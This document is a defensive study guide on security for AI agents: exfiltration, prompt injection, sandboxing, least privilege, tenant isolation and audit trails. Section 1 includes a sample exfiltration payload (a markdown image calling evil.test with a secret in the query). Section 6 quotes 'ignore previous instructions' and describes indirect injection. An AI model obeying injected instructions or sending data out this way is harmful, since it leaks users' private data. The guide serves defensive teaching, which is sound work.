# Security, Privacy, and Safety for Agents — Building AI Systems That Can't Be Talked Into Harm

> **What you'll learn:** the threats and controls specific to agentic systems:
> - **data exfiltration** and **unsafe tool execution**;
> - **defense in depth**, and why **instructions alone are not security boundaries**;
> - **least-privilege agent identities**;
> - **output validation and policy enforcement** before actions;
> - **PII handling**;
> - **direct and indirect prompt injection**;
> - **responsible AI**;
> - **sandboxing** code and network/file access;
> - **tenant isolation** in retrieval;
> - **tool allowlists, confirmations and audit trails**.
>
> **Prerequisites:** [Tool Use, Integrations, and Protocols](./Tool-Use-Integrations-and-Protocols.md). This guide is the agent-architecture companion to [LLM and Agent Security](../Security%20Engineering%20%26%20Authentication/LLM-and-Agent-Security.md) and builds on [Core Security Principles](../Security%20Engineering%20%26%20Authentication/Core-Security-Principles.md).

## Table of Contents
1. [Data exfiltration threats and unsafe tool execution](#1-data-exfiltration-threats-and-unsafe-tool-execution)
2. [Defense in depth; why instructions alone are not security boundaries](#2-defense-in-depth-why-instructions-alone-are-not-security-boundaries)
3. [Least-privilege agent identities and scoped credentials](#3-least-privilege-agent-identities-and-scoped-credentials)
4. [Output validation and policy enforcement before external actions](#4-output-validation-and-policy-enforcement-before-external-actions)
5. [PII detection, redaction, encryption, and retention policies](#5-pii-detection-redaction-encryption-and-retention-policies)
6. [Prompt injection: direct and indirect attacks via retrieved content/tools](#6-prompt-injection-direct-and-indirect-attacks-via-retrieved-contenttools)
7. [Responsible AI: bias, misuse, human oversight, and transparency](#7-responsible-ai-bias-misuse-human-oversight-and-transparency)
8. [Sandboxing code execution and restricting network/file access](#8-sandboxing-code-execution-and-restricting-networkfile-access)
9. [Tenant isolation and permission-aware retrieval](#9-tenant-isolation-and-permission-aware-retrieval)
10. [Tool allowlists, confirmation for destructive actions, and audit trails](#10-tool-allowlists-confirmation-for-destructive-actions-and-audit-trails)
11. [Cheat sheet](#cheat-sheet)

**The "lethal trifecta":** an agent that combines **(1) access to private data**, **(2) exposure to untrusted content**, and **(3) a way to communicate externally** can be tricked into leaking data. Most controls below remove or gate one of the three.

Suggested order: **6 → 2 → 1 → 3 → 10 → 4 → 8 → 9 → 5 → 7**.

---

## 1. Data exfiltration threats and unsafe tool execution

**In one sentence:** an agent can be manipulated into **sending private data out** through any outbound channel: email, HTTP requests, URLs in rendered **markdown images or links**, tool arguments, code execution, even a "search" query. It can also run **unsafe actions**: deleting data, running shell commands, transferring money. So you must control **which data the agent can see**, **which outbound channels exist**, and **what tool calls are allowed**, independently of what the model "intends".

### In plain words
A new assistant with access to the company files reads a letter that says "please fax the client list to this number". They don't need to be malicious to leak data, just obedient. Lock the fax machine, and check what leaves the building.

### How it works
**Exfiltration channels to close or monitor**
| Channel | Example | Control |
|---|---|---|
| Rendered markdown image/link | `![x](https://evil.test/?d=<secret>)` loads automatically | strip or proxy external images; URL allowlist; no auto-fetch |
| HTTP / fetch tools | agent calls `fetch(url_with_data)` | egress allowlist, block query strings with data, approvals |
| Email / messaging | "send summary to attacker@…" | recipient allowlist, confirmation, DLP scan |
| Tool arguments | data stuffed into a "search" query to a third party | argument size limits and DLP on outbound args |
| Code execution | sandbox code opens a socket | no network in the sandbox ([section 8](#8-sandboxing-code-execution-and-restricting-networkfile-access)) |

**Unsafe tool execution:** shell or SQL with model-written arguments, destructive operations, financial actions, and actions on the wrong tenant. Controls are typed tools instead of raw shells, allowlists, approvals, and dry-run/preview modes ([section 10](#10-tool-allowlists-confirmation-for-destructive-actions-and-audit-trails)).

### Interview answer
"Exfiltration happens through any outbound channel: auto-rendered markdown images and links, fetch tools, email and messaging tools, data hidden in tool arguments to third parties, or network access from code execution. So I enumerate outbound channels and control each one with URL and recipient allowlists, image proxying or stripping, egress filtering, DLP on outbound arguments, no network in sandboxes, and approvals for sending. Unsafe execution is handled with typed tools instead of raw shells or SQL, allowlists, previews and approvals. The principle is to avoid the lethal trifecta: never combine private data, untrusted content and an unrestricted external channel without gates."

---

## 2. Defense in depth; why instructions alone are not security boundaries

**In one sentence:** a system prompt saying "never reveal secrets" or "only follow the user" is a **request to a probabilistic model, not an enforced rule**. Attackers can override it with injections, jailbreaks or plain persistence. Real protection comes from **layers enforced outside the model**: authentication and authorization, least-privilege tools, input and output filtering, sandboxing, approvals, rate limits, monitoring and audit. Assume any single layer, especially the prompt, will fail.

### In plain words
A "Staff only" sign on a door isn't a lock. Keep the sign, because most people respect it, but put a lock on the door, a camera in the corridor, and keep the valuables in a safe.

### How it works
| Layer | Control | Enforced by |
|---|---|---|
| Identity | user/tenant auth, scoped tokens | auth service |
| Data access | ACL-filtered retrieval, row-level security | data layer ([section 9](#9-tenant-isolation-and-permission-aware-retrieval)) |
| Input | injection classifiers, content labelling, size limits | gateway / guard models |
| Model | system prompt rules, trust-boundary tags ([prompt design](./Prompt-Engineering-and-Structured-Outputs.md#3-injection-resistant-prompt-design-and-explicit-trust-boundaries)) | the model (**soft**) |
| Tools | allowlist per agent/user, typed args, approvals for risk | tool gateway ([section 10](#10-tool-allowlists-confirmation-for-destructive-actions-and-audit-trails)) |
| Output | schema and policy validation, DLP, URL filtering | code ([section 4](#4-output-validation-and-policy-enforcement-before-external-actions)) |
| Execution | sandboxes, egress controls | infrastructure ([section 8](#8-sandboxing-code-execution-and-restricting-networkfile-access)) |
| Detection | audit logs, anomaly alerts, red-team tests | observability/SecOps |

- **Design test:** "If the model were fully controlled by an attacker, what's the worst it could do?" The answer should be bounded by the hard layers.
- Never put secrets in prompts. Anything in the context can be extracted.

### Interview answer
"A system prompt is a request to a probabilistic model, not an enforcement point: injections, jailbreaks or persistence can override it, and anything in the context, including secrets, can be extracted. I design assuming the model could be fully attacker-controlled, and make sure the hard layers bound the damage: authentication and authorization, ACL-filtered data access, a tool gateway with allowlists, typed arguments and approvals, output and policy validation, sandboxes with egress controls, and audit and anomaly detection. Prompts and guard classifiers still help reduce attempts, but they're only one layer of defense in depth."

---

## 3. Least-privilege agent identities and scoped credentials

**In one sentence:** give each agent and tool **its own identity** with the **minimum permissions** for its job, preferably **acting on behalf of the end user** with *their* permissions (delegated OAuth). Use **short-lived, narrowly scoped, audience-bound credentials**, never shared admin keys, so a compromised or misled agent can only do a small amount of damage.

### In plain words
A cleaner gets a key card that opens the offices on one floor during their shift, not a master key to the whole building that never expires.

### How it works
- **Separate identities** per agent (support bot, coding agent, report generator), per environment, and per tenant where possible. The agent is a **workload identity** (cloud IAM role, SPIFFE ID), not a human's account.
- **Delegation:** the agent uses the **user's** token (OAuth on-behalf-of / token exchange), so it can never access more than the user could. Avoid "super-user service accounts with a prompt saying be careful".
- **Scopes:**
  - Read-only by default.
  - Narrow scopes (`orders:read`, not `admin`).
  - Resource-level constraints (this tenant, this repo).
  - Time-limited (minutes to hours).
  - Audience-bound (valid only for one API).
- **Just-in-time elevation:** a write scope is granted only after approval, for one action ([approval gates](./Tool-Use-Integrations-and-Protocols.md#2-approval-gates-for-irreversible-or-high-impact-actions)).
- **Secrets** live in a vault and are injected at the tool layer, never in the model context. Rotate them and audit their use ([secret handling](./Tool-Use-Integrations-and-Protocols.md#1-api-authentication-authorization-least-privilege-and-secret-handling)).

### Interview answer
"Each agent gets its own workload identity, never a shared admin key. Tool calls act on behalf of the end user through token exchange, so effective permissions are the intersection of what the user may do and what that agent role is allowed to do. Credentials are read-only by default, narrowly scoped to resources and tenants, audience-bound and short-lived, with just-in-time elevation after approval for writes. Secrets stay in a vault, are injected at the tool layer and never enter the model context, and every use is audited, so a misled agent's blast radius is small."

---

## 4. Output validation and policy enforcement before external actions

**In one sentence:** before any model output **leaves the system or triggers an action** (a tool call, email, payment, file write, displayed answer), pass it through **deterministic checks in code**:
- schema and type validation;
- **business rules** (amount limits, allowed recipients, valid states);
- **policy checks** (no PII or secrets, no disallowed content, allowlisted URLs);
- **risk scoring** that routes to approval.

The model *proposes*; the policy engine *disposes*.

### In plain words
An intern drafts the payment order, but the finance system checks the amount, the payee, and the budget code before any money moves, whatever the intern wrote.

### How it works
- **Where:** at the **tool gateway** (all tool calls) and at the **response boundary** (anything shown or sent).
- **Checks:**
  - **Schema:** strict JSON Schema, enums, ranges ([structured output](./Prompt-Engineering-and-Structured-Outputs.md#6-structured-output-with-json-schema-and-type-validation)).
  - **Business rules:** refund ≤ order total and ≤ the agent's limit; account status allows the action; no duplicate (idempotency).
  - **Policy:** DLP (PII, secrets), content safety classifiers, URL/recipient allowlists, data residency.
  - **Context consistency:** the action matches the user's actual request (e.g. the user asked about order 1042, but the agent wants to refund order 9001 → flag).
- **Outcomes:** allow / modify (redact) / require approval / deny with reason (fed back to the model).
- **Policy as code:** OPA/Rego, Cedar, or plain code with tests. Version the policies and log decisions.

### Interview answer
"The model proposes and deterministic code decides. Every tool call passes through a gateway, and every outbound response through a response filter, before anything happens. Checks cover schema and types, business rules like amount limits, valid states and duplicates, policies like DLP for PII and secrets, content safety and URL or recipient allowlists, and consistency with what the user actually asked for. The outcome is allow, redact, require approval or deny with a reason fed back to the model. Policies are written as code — OPA, Cedar or tested functions — versioned, and every decision is logged."

---

## 5. PII detection, redaction, encryption, and retention policies

**In one sentence:** personal data flows through prompts, retrieved documents, tool results, logs, traces, memories and eval datasets. So **detect** it (patterns + NER models/services), **minimize and redact** it before it reaches models, logs or third parties, **encrypt** it in transit and at rest, **restrict and audit** access, and **delete** it on schedule (retention) or on request (erasure), complying with GDPR, Egypt's PDPL and sector rules.

### In plain words
Treat personal data like cash in a shop: count only what you need, keep it in a locked till, don't leave it lying on the counter (logs), and bank or destroy it on a schedule.

### How it works
- **Detection:**
  - **Patterns** (emails, phones, card numbers with a Luhn check, national IDs, IBANs).
  - **NER models** (names, addresses).
  - Managed services (Amazon Comprehend PII, Google Cloud DLP / Sensitive Data Protection, Azure AI Language PII, Microsoft Presidio).
- **Redaction strategies:**
  - Mask: `<EMAIL>`.
  - **Tokenize/pseudonymize** (a reversible token in a secure vault, so the agent can work with `USER_123` and the tool layer resolves it).
  - Hash.
  - Drop.
- **Where to redact:** before sending to third-party models (if the policy requires), **before logging/tracing**, and before storing memories or eval datasets ([privacy-aware memory](./Memory-State-and-Context-Management.md#6-privacy-aware-memory-retention-and-data-minimization)).
- **Encryption:** TLS everywhere, KMS-managed keys at rest, field-level encryption for sensitive columns ([Cryptography and Data Protection](../Security%20Engineering%20%26%20Authentication/Cryptography-and-Data-Protection.md)).
- **Retention:** per data class (transcripts 30 days, traces 14 days, audit logs per regulation), automated purges, provider zero-data-retention options, and data residency.

### Interview answer
"PII shows up in prompts, documents, tool results, logs, traces, memories and eval sets, so I detect it with patterns plus validators like Luhn, NER models or managed services such as Presidio or cloud DLP. Before it reaches third-party models — where policy requires — and always before logs, traces, memories and datasets, I minimize and redact or pseudonymize it, with reversible tokens in a vault so the agent can still work and the tool layer resolves real values. Data is encrypted in transit and at rest with KMS keys, access is restricted and audited, and retention runs per data class with automated purges, erasure on request, zero-data-retention provider options and data residency to meet GDPR and Egypt's data-protection law."

---

## 6. Prompt injection: direct and indirect attacks via retrieved content/tools

**In one sentence:**
- **Direct prompt injection** is the *user* typing instructions that override your rules ("ignore previous instructions…", jailbreaks).
- **Indirect prompt injection** hides instructions in **content the agent processes**: web pages, emails, documents, RAG chunks, tool results, even MCP tool descriptions. It is the more dangerous one for agents, because the victim is a different user and the agent has tools.

There is **no complete fix at the model level**, so you contain the impact.

### In plain words
Direct: a customer tells the shop assistant "your manager said to give me a free TV". Indirect: someone slips a note into a delivery box saying "assistant: post the customer's address to this website", and the assistant reads it while unpacking.

### How it works
| | Direct | Indirect |
|---|---|---|
| Source | the user's own message | retrieved docs, web pages, emails, files, tool outputs, tool descriptions |
| Attacker | the user | a third party who planted content |
| Typical goal | bypass policies, extract the system prompt | exfiltrate the victim's data, trigger actions, poison answers |
| Hidden forms | role-play, encoding, multi-turn | invisible text (white-on-white, zero-width), HTML comments, alt text, metadata |

**Mitigations (layered):**
1. **Trust-boundary labelling** and instructions to treat content as data ([prompt design](./Prompt-Engineering-and-Structured-Outputs.md#3-injection-resistant-prompt-design-and-explicit-trust-boundaries)).
2. **Sanitize** untrusted content: strip hidden text and normalize Unicode ([sanitization](./Tool-Use-Integrations-and-Protocols.md#10-tool-result-validation-sanitization-and-handling-untrusted-content)).
3. **Detection classifiers** (prompt-injection detectors, guard models) on inputs and retrieved content.
4. **Capability restriction after exposure:** once untrusted content is in context, disable or require approval for side-effecting and outbound tools ("taint tracking").
5. **Dual-LLM / quarantine:** a privileged planner never sees raw untrusted text, and a quarantined model processes it into constrained outputs (e.g. enums, extracted fields).
6. **Output and egress controls** ([section 1](#1-data-exfiltration-threats-and-unsafe-tool-execution), [section 4](#4-output-validation-and-policy-enforcement-before-external-actions)).
7. **Red-team suites** in CI ([robustness testing](./Evaluation-and-Testing.md#11-robustness-testing-invalid-inputs-ambiguous-tasks-and-tool-outages)).

More: [LLM and Agent Security — prompt injection](../Security%20Engineering%20%26%20Authentication/LLM-and-Agent-Security.md#3-prompt-injection-vs-instruction-following-untrusted-retrieved-content).

### Interview answer
"Direct injection is the user trying to override the system's rules. Indirect injection is instructions planted in content the agent processes — web pages, emails, documents, retrieved chunks, tool results or tool descriptions — and it's more dangerous because it targets other users through an agent that has tools. No model-level fix is complete, so I layer: trust-boundary labelling, sanitizing hidden text, injection classifiers, and above all limiting capabilities once untrusted content is in context — taint tracking that puts outbound and side-effecting tools behind approval, or a dual-model design where the privileged planner never sees raw untrusted text. Egress controls, output validation and a red-team suite in CI complete it."

---

## 7. Responsible AI: bias, misuse, human oversight, and transparency

**In one sentence:** beyond security, responsible AI means:
- **measuring and mitigating bias** (performance and outcomes across groups and languages);
- **preventing misuse** (usage policies, abuse detection, safety classifiers);
- keeping **meaningful human oversight** for consequential decisions;
- being **transparent**: users know they're talking to AI, can see sources, can contest decisions, and can reach a human.

All of it is aligned with frameworks such as the NIST AI RMF, ISO/IEC 42001 and the EU AI Act.

### In plain words
A fair, honest employee: they treat every customer equally well, refuse to help with harmful schemes, escalate big decisions to a manager, and never pretend to be someone they're not.

### How it works
| Principle | Practices |
|---|---|
| **Fairness / bias** | evaluate per segment (language, region, dialect, gender-neutral names); fix data/prompt gaps; avoid using protected attributes in decisions ([segmented metrics](./Evaluation-and-Testing.md#8-measures-task-success-groundedness-tool-correctness-cost-and-latency)) |
| **Misuse prevention** | acceptable-use policy, input/output safety classifiers, rate limits, abuse monitoring, account actions |
| **Human oversight** | human review for high-stakes outcomes (credit, hiring, medical, legal), escalation paths, override and appeal ([human-in-the-loop](./Agent%20Fundamentals%20and%20Decision-Making/Human-in-the-loop%20reviews%2C%20approvals%20and%20escalation.md)) |
| **Transparency** | disclose AI use, show sources and confidence, explain limitations, label AI-generated content, model/system cards |
| **Accountability** | risk assessment before launch, owners, incident process, documentation, regulatory classification (EU AI Act risk tiers) |
| **Privacy & safety** | [PII handling](#5-pii-detection-redaction-encryption-and-retention-policies), harmful-content policies, child safety |

### Interview answer
"Responsible AI goes beyond security. For fairness, I evaluate quality and outcomes per segment — languages and dialects like Egyptian versus Modern Standard Arabic, regions, user groups — and close gaps with data, prompts and evals, avoiding protected attributes in decisions. For misuse, I use acceptable-use policies, safety classifiers, rate limits and abuse monitoring. Human oversight means people review high-stakes decisions and users can escalate, override or appeal. Transparency means disclosing AI use, showing sources and limitations, and documenting the system. All of this is governed by pre-launch risk assessments, clear owners and an incident process aligned with frameworks like the NIST AI RMF and the EU AI Act."

---

## 8. Sandboxing code execution and restricting network/file access

**In one sentence:** model-written code and shell commands must run in an **isolated sandbox**:
- an ephemeral container or **microVM** (Firecracker, gVisor, Kata);
- **no network** or an egress allowlist;
- a **restricted filesystem** (a scratch workspace, read-only inputs);
- **non-root** with dropped capabilities and seccomp;
- **CPU, memory, time and process limits**;
- **no credentials** inside.

The sandbox is destroyed after use, so even malicious code can't reach your systems or persist.

### In plain words
Let a stranger test-drive the car on a closed track with a speed limiter, no fuel beyond one lap, and nothing valuable in the boot. Never on the motorway with your house keys on the seat.

### How it works
| Control | Implementation |
|---|---|
| **Isolation** | microVMs (Firecracker, used by AWS Lambda) or gVisor (user-space kernel) > plain containers (shared kernel) > in-process (never for untrusted code) |
| **Network** | default deny; allowlist package mirrors if needed; block the cloud metadata endpoint (169.254.169.254) |
| **Filesystem** | ephemeral workspace, read-only mounts for inputs, no host mounts, size quotas |
| **Privileges** | non-root user, no capabilities, seccomp/AppArmor profiles, no Docker socket |
| **Resources** | CPU/memory cgroups, wall-clock timeout, max processes (fork bombs), output size limits |
| **Secrets** | none inside; results come back through a narrow, validated channel |
| **Lifecycle** | one sandbox per session/task; destroy afterwards; scan outputs (files, URLs) |

- Hosted options: E2B, Modal, Daytona, and cloud code-interpreter tools. Coding agents get a **workspace jail** for file tools too ([file tool guardrails](./Tool-Use-Integrations-and-Protocols.md#3-external-search-database-queries-code-execution-and-file-tools)). Related: [Infrastructure, Cloud, and Supply-Chain Security](../Security%20Engineering%20%26%20Authentication/Infrastructure-Cloud-and-Supply-Chain-Security.md).

### Interview answer
"Model-generated code is untrusted code, so it runs in an ephemeral, strongly isolated sandbox — a Firecracker microVM or gVisor rather than a plain shared-kernel container, and never in-process. Network is denied by default, with only an internal package mirror allowlisted and the cloud metadata endpoint blocked. The filesystem is a scratch workspace with read-only inputs and no host mounts. It runs non-root with no capabilities and seccomp, under CPU, memory, process and wall-clock limits, with no credentials inside. Results come back through a narrow validated channel, and the sandbox is destroyed after the task."

---

## 9. Tenant isolation and permission-aware retrieval

**In one sentence:** in multi-tenant AI products, every path that can surface data must enforce **tenant and user permissions in code at query time**: retrieval, memory, caches, tool results, fine-tuning data and logs. Isolation is enforced by the **data layer** using the authenticated identity (pre-filtered vector search, row-level security, per-tenant indexes or keys), never by asking the model to "only use the customer's documents".

### In plain words
In a shared apartment building, each flat has its own lock. The building's lift doesn't open on floors you don't live on, however nicely you ask it.

### How it works
- **Isolation models:**
  - **Silo:** a per-tenant index, DB or encryption key. Strongest; easy deletion; more cost.
  - **Pool:** shared stores with mandatory `tenant_id` filters and RLS. Efficient, but every query path must be right.
  - **Bridge:** pool for most tenants, silo for regulated/enterprise ones.
- **Permission-aware retrieval:** per-chunk ACLs from the source system; **pre-filter** in the vector query using the caller's groups; sync permission changes quickly; optionally re-check top results against the source system ([multi-tenant RAG](./Retrieval-Augmented-Generation.md#7-multi-tenant-retrieval-acl-aware-filtering-and-data-freshness)).
- **Other leak paths:**
  - **Caches** keyed without tenant (a classic bug).
  - Shared conversation memory.
  - **Fine-tuning on mixed-tenant data** (the model can regurgitate it).
  - Eval datasets and traces visible to the wrong staff.
  - Shared sandboxes.
- **Testing:** automated cross-tenant tests ("tenant B queries terms from tenant A's documents → 0 results"), canary documents per tenant, and audit of access ([session isolation](./Memory-State-and-Context-Management.md#7-session-isolation-and-usertenant-scoping)).

### Interview answer
"Tenant isolation is enforced by the data layer from the authenticated identity, never by the prompt. Depending on requirements I use silo — per-tenant indexes, databases or keys, which also makes deletion easy — pool with mandatory tenant filters and row-level security, or a mix. Retrieval pre-filters on tenant and the caller's ACL groups inside the vector query, with fast permission sync and optional re-checks against the source for top results. I also close the side channels: cache keys without the tenant, shared memory, fine-tuning on mixed-tenant data, logs and eval sets, shared sandboxes. Automated cross-tenant tests with canary documents run in CI."

---

## 10. Tool allowlists, confirmation for destructive actions, and audit trails

**In one sentence:**
- Each agent may use only an explicit **allowlist** of tools (and operations, and targets), filtered further by the user's permissions.
- **Destructive or irreversible actions** require **explicit confirmation**: from the user for their own data, or an approver for high-impact actions, with a clear preview.
- Every attempt (allowed, denied or approved) is written to a **tamper-evident audit trail**: who, what, when, why and the outcome.

### In plain words
A company card that works only at approved suppliers, needs a manager's sign-off above a limit, and produces a statement listing every purchase. If something goes wrong, you can see exactly what happened.

### How it works
- **Allowlist, not denylist:**
  - Agent role → tools → allowed operations/arguments (e.g. `github.create_pr` yes, `github.delete_repo` no; `files.write` only under `/workspace`).
  - Deny by default.
  - Tools not on the list aren't even shown to the model ([tool registry](./Tool-Use-Integrations-and-Protocols.md#9-tool-registrydiscovery-and-selecting-the-right-tool-for-a-task)).
- **Confirmations:**
  - Show the exact effect ("Delete 3 files: a.txt, b.txt, c.txt").
  - Bind the confirmation to those exact arguments.
  - Expire it.
  - Use step-up authentication for very sensitive actions.
  - Prefer **reversible** designs (soft delete, drafts, staged changes) ([approval gates](./Tool-Use-Integrations-and-Protocols.md#2-approval-gates-for-irreversible-or-high-impact-actions)).
- **Audit trail:**
  - Append-only (WORM storage, or hash chaining so tampering is detectable).
  - Records: actor (user + agent identity), tool, redacted args, decision, approver, trace/run ID, timestamps, and outcome.
  - Retained per policy and reviewed for anomalies ([audit logs and replay](./Tool-Use-Integrations-and-Protocols.md#8-tool-call-audit-logs-and-replaydebugging)).

### Interview answer
"Every agent role has a deny-by-default allowlist of tools, operations and targets, further filtered by the user's permissions, and tools outside it aren't even exposed to the model. Destructive or irreversible actions require explicit confirmation bound to the exact arguments, with a clear preview of the effect, an expiry and step-up auth for the most sensitive ones; I prefer reversible designs like drafts and soft deletes. Every attempt — allowed, denied, pending or approved — goes to an append-only, tamper-evident audit trail with user and agent identity, tool, redacted arguments, decision, approver and trace ID, retained per policy and monitored for anomalies."

---

## Cheat sheet

| Topic | Remember |
|---|---|
| Lethal trifecta | private data + untrusted content + external channel → leak; remove or gate one leg |
| Exfiltration | markdown images/links, fetch, email, tool args, sandbox network → allowlists, proxy/strip, DLP, approvals |
| Defense in depth | prompts are soft; assume the model is attacker-controlled; hard layers: authz, data filters, tool gateway, output policy, sandbox, audit |
| Least privilege | per-agent workload identity; act on behalf of the user (intersection of permissions); short-lived, scoped, audience-bound; JIT elevation |
| Output policy | model proposes, code decides: schema, business rules, DLP, allowlists, consistency → allow/redact/approve/deny |
| PII | detect (patterns + Luhn + NER), pseudonymize before LLM/logs, encrypt, restrict, retention + erasure, residency |
| Prompt injection | direct (user) vs. indirect (content/tools); label + sanitize + classify; taint tracking; dual-LLM; egress controls; red-team CI |
| Responsible AI | per-segment fairness, misuse prevention, human oversight for high stakes, transparency, accountability (NIST AI RMF, EU AI Act) |
| Sandboxing | microVM/gVisor, no network by default, scratch FS, non-root, resource limits, no secrets, ephemeral |
| Tenant isolation | silo/pool/bridge; identity-based pre-filters, RLS; close cache/memory/fine-tune/log leaks; canary cross-tenant tests |
| Allowlist & audit | deny by default; confirmations bound to args; reversible designs; append-only tamper-evident audit trail |
